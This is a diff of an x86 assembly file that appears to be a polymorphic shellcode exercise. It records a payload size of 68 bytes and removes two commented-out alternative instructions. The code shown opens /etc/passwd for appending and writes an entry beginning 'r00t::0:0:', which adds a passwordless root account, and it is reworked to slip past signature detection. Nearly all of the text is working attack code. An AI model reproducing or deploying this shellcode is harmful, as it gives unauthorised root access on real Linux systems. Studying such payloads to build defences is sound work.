@@ -4,7 +4,7 @@
 
 ;Original Lenght: 69 bytes 
 
-;Polymorphic version: x bytes
+;Polymorphic version: 68 bytes
 
 section .text
 
@@ -20,7 +20,6 @@ _start:
 	push dword 0x61702f2f
 	push dword 0x6374652f
 	mov ebx,esp
-				;lea ebx,[ebp-44] ;Other version, but the lenght of the shellcode is increased 
 	mov cx,0x401
 	int 0x80
 
@@ -38,7 +37,6 @@ _start:
 	push dword 0x3a303a3a
 	push dword 0x74303072
 	mov ecx,esp
-				;lea ecx,[ebp-60] ;If we want to modify more the code, but the lenght of the shellcode is increased
 	push byte +0xc
 	pop edx
 	int 0x80
